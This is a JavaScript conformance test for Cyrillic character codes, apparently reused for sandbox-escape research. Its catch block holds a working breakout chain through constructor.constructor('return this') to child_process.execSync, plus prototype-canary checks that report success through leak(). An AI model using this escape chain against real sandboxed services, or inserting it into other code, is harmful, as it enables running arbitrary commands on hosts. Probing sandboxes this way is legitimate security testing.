try {
    var CharacterCode = [
        1072,
        1073,
        1074,
        1075,
        1076,
        1077,
        1078,
        1079,
        1080,
        1081,
        1082,
        1083,
        1084,
        1085,
        1086,
        1087,
        1088,
        1089,
        1090,
        1091,
        1092,
        1093,
        1094,
        1095,
        1096,
        1097,
        1098,
        1099,
        1100,
        1101,
        1102,
        1103,
        1105
    ];
    var NonEscapeCharacter = [
        'а',
        'б',
        'в',
        'г',
        'д',
        'е',
        'ж',
        'з',
        'и',
        'й',
        'к',
        'л',
        'м',
        'н',
        'о',
        'п',
        'р',
        'с',
        'т',
        'у',
        'ф',
        'х',
        'ц',
        'ч',
        'ш',
        'щ',
        'ъ',
        'ы',
        'ь',
        'э',
        'ю',
        'я',
        'ё'
    ];
    for (var index = 0; index <= 32; index++) {
        if (String.fromCharCode(CharacterCode[index]) !== NonEscapeCharacter[index]) {
            $ERROR('#' + NonEscapeCharacter[index] + ' ');
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}